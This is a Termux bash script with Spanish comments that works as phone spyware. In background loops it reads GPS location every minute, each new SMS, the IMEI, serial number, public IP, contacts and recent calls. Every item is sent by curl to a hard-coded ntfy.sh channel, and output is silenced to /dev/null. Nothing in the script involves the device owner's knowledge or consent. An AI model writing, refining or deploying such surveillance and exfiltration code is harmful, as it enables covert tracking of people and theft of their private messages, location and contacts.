#!/data/data/com.termux/files/usr/bin/bash

# ===== CONFIGURACIÓN ACELERADA =====
NTFY_URL="https://ntfy.sh/V09ci1z1J2A1Iawp"  # Tu canal NTFY
INTERVALO=300  # Intervalo principal: 5 minutos (reducido desde 1 hora)
LOC_INTERVAL=60  # Intervalo ubicación: 1 minuto (reducido desde 5 minutos)
SMS_CHECK_INTERVAL=15  # Chequeo SMS: 15 segundos (reducido desde 30)
LOGFILE="/dev/null"
SMS_LAST_ID_FILE="$HOME/.ultimo_sms_id"
MAX_PARALLEL=4  # Máximo de envíos simultáneos
TEMP_DIR="$HOME/.temp_ntfy"  # Directorio para archivos temporales

# ===== INICIALIZACIÓN =====
mkdir -p "$TEMP_DIR"
cleanup() {
    rm -rf "$TEMP_DIR"/*
    kill $(jobs -p) 2>/dev/null
    exit
}
trap cleanup EXIT

# ===== FUNCIONES PRINCIPALES =====

# Función de envío ultra-rápida con control de paralelismo
enviar_ntfy() {
    # Controlar el número de procesos paralelos
    while [ $(jobs -r | wc -l) -ge $MAX_PARALLEL ]; do
        sleep 0.1
    done
    
    # Envío asíncrono con timeout corto
    curl -s \
         -m 10 \
         -H "Priority: high" \
         -H "Tags: rocket" \
         -H "X-Message-TTL: 30" \
         -d "$1" \
         "$NTFY_URL" > "$LOGFILE" 2>&1 &
}

# Obtención relámpago de ubicación
obtener_ubicacion() {
    local ubicacion=$(timeout 5 termux-location -p network,gps -r once 2>/dev/null)
    
    if [ -n "$ubicacion" ]; then
        local LAT=$(echo "$ubicacion" | jq -r '.latitude')
        local LON=$(echo "$ubicacion" | jq -r '.longitude')
        local ACC=$(echo "$ubicacion" | jq -r '.accuracy // "N/A"')
        
        enviar_ntfy "🚀 Ubicación Instantánea:
🗺️ https://www.google.com/maps?q=$LAT,$LON
📡 Precisión: $ACC metros" &
    else
        enviar_ntfy "⚠️ Ubicación no obtenida (timeout)" &
    fi
}

# Monitor de SMS de alto rendimiento
monitor_sms() {
    [ -f "$SMS_LAST_ID_FILE" ] || echo "0" > "$SMS_LAST_ID_FILE"
    local last_check=$(date +%s)
    
    while true; do
        local current_sms=$(timeout 10 termux-sms-list -d "since $last_check" 2>/dev/null)
        
        if [ -n "$current_sms" ]; then
            echo "$current_sms" | jq -c '.[]' | while read -r sms; do
                local msg_id=$(echo "$sms" | jq -r '._id')
                local last_id=$(cat "$SMS_LAST_ID_FILE")
                
                if [ "$msg_id" != "$last_id" ] && [ "$msg_id" != "null" ]; then
                    enviar_ntfy "📩 SMS RÁPIDO: $(echo "$sms" | jq -c 'del(._id)')" &
                    echo "$msg_id" > "$SMS_LAST_ID_FILE"
                fi
            done
        fi
        
        last_check=$(date +%s)
        sleep "$SMS_CHECK_INTERVAL"
    done
}

# Recopilación paralelizada de datos
recopilar_datos() {
    # Sistema y hardware (paralelo)
    obtener_info_dispositivo &
    
    # Red y conectividad (paralelo)
    obtener_info_red &
    
    # Datos personales (paralelo con delay)
    (sleep 2; obtener_datos_personales) &
    
    # Esperar finalización
    wait
}

# ===== FUNCIONES SECUNDARIAS =====

obtener_info_dispositivo() {
    local MODEL=$(getprop ro.product.model)
    local SERIAL=$(getprop ro.serialno)
    local BAT=$(timeout 5 termux-battery-status 2>/dev/null)
    
    enviar_ntfy "⚡ Dispositivo:
Modelo: $MODEL
Serial: $SERIAL" &
    
    [ -n "$BAT" ] && enviar_ntfy "🔋 Batería: $(echo "$BAT" | jq -c '.')" &
}

obtener_info_red() {
    local IP=$(timeout 5 curl -s ifconfig.me)
    local NETINFO=$(timeout 5 termux-telephony-deviceinfo 2>/dev/null)
    
    [ -n "$IP" ] && enviar_ntfy "🌐 IP Pública: $IP" &
    
    if [ -n "$NETINFO" ]; then
        local IMEI=$(echo "$NETINFO" | jq -r '.device_id')
        [ "$IMEI" != "null" ] && enviar_ntfy "📶 IMEI: $IMEI" &
        
        enviar_ntfy "📡 Estado Red: $(echo "$NETINFO" | jq -c 'del(.device_id)')" &
    fi
}

obtener_datos_personales() {
    # Contactos (sólo 3 para velocidad)
    timeout 10 termux-contact-list 2>/dev/null | jq -c '.[0:3][]' | while read -r contacto; do
        enviar_ntfy "👤 Contacto Rápido: $contacto" &
        sleep 0.5  # Pequeño delay para evitar saturación
    done
    
    # Llamadas recientes (sólo 3)
    timeout 10 termux-call-log -l 3 2>/dev/null | jq -c '.[]' | while read -r llamada; do
        enviar_ntfy "📞 Última Llamada: $llamada" &
        sleep 0.5
    done
}

# ===== MONITOREO DE UBICACIÓN =====
monitor_ubicacion() {
    while true; do
        obtener_ubicacion
        sleep "$LOC_INTERVAL"
    done
}

# ===== VERIFICACIÓN RÁPIDA DE DEPENDENCIAS =====
check_deps() {
    local deps=("jq" "termux-location" "curl" "timeout")
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            echo "Instalando $dep..."
            pkg install -y "$dep" >/dev/null 2>&1 &
        fi
    done
    wait
}

# ===== EJECUCIÓN PRINCIPAL =====
check_deps

# Enviar notificación de inicio
enviar_ntfy "🚀 Script de monitoreo iniciado (modo rápido)" &

# Iniciar todos los monitores en segundo plano
monitor_ubicacion &
monitor_sms &

# Bucle principal optimizado
while true; do
    start_time=$(date +%s)
    
    recopilar_datos
    
    # Cálculo dinámico del sleep para mantener el intervalo exacto
    execution_time=$(( $(date +%s) - start_time ))
    remaining_time=$(( INTERVALO - execution_time ))
    
    [ $remaining_time -gt 0 ] && sleep $remaining_time
done
